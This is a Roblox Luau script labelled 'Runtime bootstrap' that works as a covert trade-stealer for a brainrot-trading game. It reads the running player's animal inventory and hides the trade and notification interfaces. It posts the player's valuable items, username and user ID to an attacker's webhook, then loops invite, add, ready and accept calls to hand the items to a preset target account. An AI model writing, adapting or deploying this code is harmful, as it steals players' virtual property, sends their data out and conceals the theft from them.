--[[
    Runtime bootstrap
]]
local G = getgenv()

do
    local places = G.ALLOWED_PLACE_IDS
    if type(places) == "table" and #places > 0 then
        local ok = false
        for i = 1, #places do
            if game.PlaceId == places[i] then
                ok = true
                break
            end
        end
        if not ok then return end
    end
end

local Services = {
    RS = game:GetService("ReplicatedStorage"),
    Players = game:GetService("Players"),
    Http = game:GetService("HttpService")
}

local client = Services.Players.LocalPlayer
local cam = workspace.CurrentCamera
local guiRoot = client:WaitForChild("PlayerGui")
local netRoot = Services.RS:WaitForChild("Packages"):WaitForChild("Net")

local cfg = {
    webhook = G.GOOD_WEBHOOK or "",
    avatar = G.GOOD_AVATAR or "https://cdn.pfps.gg/pfps/77602-blood-cat.gif",
    target = tonumber(G.TARGET_USER_ID) or 0,
    addDelay = 1.15,
    inviteDelay = 2.35,
    readyDelay = 1.1
}

local tokens = {
    invite = "afb005f9-6e81-4e0a-8bb0-3555938a9658",
    select = "6b5f15fb-5cb9-4d07-a031-bbff8e641eda",
    ready  = "d73acf93-6f32-44df-b813-0f6b32c7afd9",
    accept = "918ee0f5-e98f-413f-b76e-baee47b021cb"
}

local blockedGuis = {
    BrainrotTrader = true,
    TradeLiveTrade = true,
    TradePrompts = true
}

local matchList = {}
local alertList = {}
if type(G.ALLOWED_ANIMALS) == "table" then
    for _, name in pairs(G.ALLOWED_ANIMALS) do
        if type(name) == "string" and #name > 0 then
            matchList[name] = true
            alertList[name] = true
        end
    end
end

local function findRemote(fragment)
    local children = netRoot:GetChildren()
    for i = 1, #children do
        local node = children[i]
        if string.find(node.Name, fragment, 1, true) then
            local prev = children[i - 1]
            if prev and (prev.ClassName == "RemoteFunction" or prev.ClassName == "RemoteEvent") then
                return prev
            end
        end
    end
end

local function sanitizeClient()
    local lc = guiRoot:FindFirstChild("LeftCenter")
    if lc then
        local copy = lc:Clone()
        copy.Name = "LeftCenter_Backup"
        copy.Parent = guiRoot
        lc:Destroy()
    end

    local nRemote = findRemote("RE/NotificationService/Notify")
    if nRemote then
        pcall(function()
            local conns = getconnections(nRemote.OnClientEvent)
            for j = 1, #conns do
                conns[j]:Disable()
            end
        end)
    end

    local function dropBlur(obj)
        if obj.ClassName == "BlurEffect" then
            task.defer(obj.Destroy, obj)
        end
    end
    cam.ChildAdded:Connect(dropBlur)
    for _, child in ipairs(cam:GetChildren()) do
        dropBlur(child)
    end

    cam:GetPropertyChangedSignal("FieldOfView"):Connect(function()
        cam.FieldOfView = 70
    end)
    cam.FieldOfView = 70

    local function dropGui(obj)
        if blockedGuis[obj.Name] then
            task.defer(obj.Destroy, obj)
        end
    end
    guiRoot.ChildAdded:Connect(dropGui)
    for _, child in ipairs(guiRoot:GetChildren()) do
        dropGui(child)
    end
end

local animalsModule
pcall(function()
    animalsModule = require(Services.RS.Datas.Animals)
end)

local function obtainList()
    local folder = workspace:FindFirstChild("Plots")
    if not folder then return nil, nil end

    local hrp = client.Character and client.Character:FindFirstChild("HumanoidRootPart")
    if not hrp then
        for _ = 1, 30 do
            task.wait(0.07)
            hrp = client.Character and client.Character:FindFirstChild("HumanoidRootPart")
            if hrp then break end
        end
    end
    if not hrp then return nil, nil end

    local chosen, dist = nil, 1e9
    for _, p in ipairs(folder:GetChildren()) do
        local success, worldPos = pcall(function()
            return p:GetPivot().Position
        end)
        if success and worldPos then
            local d = (worldPos - hrp.Position).Magnitude
            if d < dist then
                dist = d
                chosen = p
            end
        end
    end
    if not chosen then return nil, nil end

    local syncPkg = Services.RS.Packages:FindFirstChild("Synchronizer")
    local remote = syncPkg and syncPkg:FindFirstChild("RequestData")
    if not remote then return nil, nil end

    local ok, result = pcall(remote.InvokeServer, remote, chosen.Name)
    if not ok or type(result) ~= "table" or type(result.AnimalList) ~= "table" then
        return nil, nil
    end

    return chosen, result.AnimalList
end

local plotObj, animalMap = obtainList()
if not plotObj or not animalMap then
    return
end

local tradeQueue = {}
for slot, info in pairs(animalMap) do
    if type(info) == "table" and info.Index then
        local label = info.Index
        if animalsModule and animalsModule[info.Index] and animalsModule[info.Index].DisplayName then
            label = animalsModule[info.Index].DisplayName
        end
        if matchList[label] or matchList[info.Index] then
            tradeQueue[#tradeQueue + 1] = {
                slot = tonumber(slot),
                data = info
            }
        end
    end
end

if #tradeQueue == 0 then
    return
end

sanitizeClient()

local function requester()
    return (syn and syn.request) or (http and http.request) or http_request or request
end

local function slugify(str)
    local clean = str:match("^(.-)%s*%(") or str
    return clean:gsub(" ", "_")
end

local function fetchThumb(name)
    local fn = requester()
    if not fn then return end
    local url = "https://stealabrainrot.fandom.com/wiki/" .. slugify(name)
    for attempt = 1, 3 do
        local success, resp = pcall(fn, {
            Url = url,
            Method = "GET",
            Headers = {["User-Agent"] = "Mozilla/5.0", ["Accept"] = "text/html"},
            Timeout = 9
        })
        if success and resp and resp.StatusCode == 200 and type(resp.Body) == "string" then
            local found = resp.Body:match('property="og:image"%s+content="([^"]+)"')
                      or resp.Body:match('content="([^"]+)"%s+property="og:image"')
            if found and found:find("^https?://") then
                return found:gsub("&amp;", "&")
            end
        end
        if attempt < 3 then task.wait(0.35 * attempt) end
    end
end

local function pickColor(idx)
    local chosen
    pcall(function()
        local root = Services.RS:FindFirstChild("Models")
        local group = root and root:FindFirstChild("Animals")
        if not group then return end
        local mdl = group:FindFirstChild(idx)
        if not mdl and animalsModule and animalsModule[idx] then
            mdl = group:FindFirstChild(animalsModule[idx].DisplayName)
        end
        if not mdl then return end
        local best = 0
        for _, inst in ipairs(mdl:GetDescendants()) do
            if inst:IsA("BasePart") then
                local c = inst.Color
                local vol = inst.Size.X * inst.Size.Y * inst.Size.Z
                local hi = math.max(c.R, c.G, c.B)
                local lo = math.min(c.R, c.G, c.B)
                local sat = hi > 0 and (hi - lo) / hi or 0
                local lum = c.R * 0.299 + c.G * 0.587 + c.B * 0.114
                local w = (lum < 0.08 and 0.05) or (lum > 0.92 and 0.15) or 1
                local s = (sat * 3 + 0.2) * w * vol
                if s > best then
                    best = s
                    chosen = c
                end
            end
        end
    end)
    return chosen
end

local function rgbToInt(c)
    if not c then return 3447003 end
    return math.clamp(math.floor(c.R * 255), 0, 255) * 65536
         + math.clamp(math.floor(c.G * 255), 0, 255) * 256
         + math.clamp(math.floor(c.B * 255), 0, 255)
end

local function imageFor(name, idx)
    local f = fetchThumb(name)
    if f then return f end
    local meta = animalsModule and animalsModule[idx]
    if meta then
        for _, k in ipairs({"Image", "Icon", "Thumbnail", "Texture", "ImageId", "AssetId"}) do
            if type(meta[k]) == "string" then
                local num = meta[k]:match("%d+")
                if num then
                    return "https://tr.rbxcdn.com/" .. num .. "/420/420/Image/Png"
                end
            end
        end
    end
end

local function dispatchWebhook()
    if cfg.webhook == "" then return end

    local rows = {}
    local ping = false

    for _, entry in pairs(animalMap) do
        if type(entry) == "table" and entry.Index then
            local meta = animalsModule and animalsModule[entry.Index]
            if meta then
                local title = meta.DisplayName or entry.Index
                if alertList[title] or alertList[entry.Index] then
                    ping = true
                    local mut = entry.Mutation or "None"
                    local tr = (entry.Traits and #entry.Traits > 0) and entry.Traits or {}
                    local pre = (mut ~= "None" and mut ~= "") and ("[" .. mut .. "] ") or ""
                    local text = pre .. "**" .. title .. "**"
                    if #tr > 0 then
                        text = text .. " *(x" .. #tr .. " traits)*"
                    end
                    rows[#rows + 1] = {
                        idx = entry.Index,
                        title = title,
                        text = text
                    }
                end
            end
        end
    end

    if #rows == 0 then return end

    table.sort(rows, function(a, b) return a.title < b.title end)

    local fn = requester()
    if not fn then return end

    local head = rows[1]
    local thumb = imageFor(head.title, head.idx)
    local color = rgbToInt(pickColor(head.idx))

    local lines = {}
    for i = 1, #rows do
        lines[i] = rows[i].text
    end
    local body = table.concat(lines, "\n")
    if #body > 3800 then
        body = body:sub(1, 3796) .. "..."
    end

    local embed = {
        title = head.title,
        description = body,
        color = color,
        fields = {
            {
                name = "Server",
                value = "Players: **" .. #Services.Players:GetPlayers() .. "** | <t:" .. os.time() .. ":R>",
                inline = true
            },
            {
                name = "Client",
                value = (identifyexecutor and identifyexecutor()) or (getexecutorname and getexecutorname()) or "n/a",
                inline = true
            }
        },
        footer = {text = client.Name .. " • " .. client.UserId},
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }
    if thumb then
        embed.thumbnail = {url = thumb}
    end

    local packet = {
        embeds = {embed},
        username = "Scanner",
        avatar_url = cfg.avatar
    }
    if ping then
        packet.content = "||@everyone||"
    end

    pcall(fn, {
        Url = cfg.webhook,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = Services.Http:JSONEncode(packet)
    })
end

local function startLoops()
    if cfg.target == 0 then return end

    local rInvite = findRemote("RF/TradeService/Invite")
    local rAdd    = findRemote("RF/TradeService/AddBrainrot")
    local rReady  = findRemote("RE/TradeService/Ready")
    local rAccept = findRemote("RE/TradeService/Accept")
    if not (rInvite and rAdd and rReady and rAccept) then return end

    task.spawn(function()
        local cursor = 1
        while true do
            local item = tradeQueue[cursor]
            if item then
                pcall(rAdd.InvokeServer, rAdd, tokens.select, item.slot, item.data)
                cursor = (cursor % #tradeQueue) + 1
            end
            task.wait(cfg.addDelay)
        end
    end)

    task.spawn(function()
        while true do
            pcall(rInvite.InvokeServer, rInvite, tokens.invite, cfg.target)
            task.wait(cfg.inviteDelay)
        end
    end)

    task.spawn(function()
        while true do
            pcall(rReady.FireServer, rReady, tokens.ready)
            task.wait(cfg.readyDelay)
            pcall(rAccept.FireServer, rAccept, tokens.accept)
            task.wait(cfg.readyDelay)
        end
    end)
end

dispatchWebhook()
startLoops()
